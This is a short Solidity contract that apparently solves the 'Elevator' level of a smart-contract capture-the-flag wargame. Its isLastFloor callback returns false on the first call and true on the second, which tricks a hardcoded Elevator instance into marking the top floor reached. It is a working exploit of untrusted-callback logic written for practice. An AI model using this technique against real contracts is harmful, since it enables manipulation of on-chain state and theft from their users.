//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../instances/Ilevel11.sol";

contract BadBuilding {
    Elevator level11 = Elevator(0x20CbEF4c967D99bBCE33183e5DdF790162Be0400);

    bool flag;

    function goToFloor() public {
        level11.goTo(1);
    }

    function isLastFloor(uint) external returns (bool) {
        if (!flag) {
            flag = true;
            return false; //first return value;
        }

        flag = false;
        return true; //second return value;
    }
}
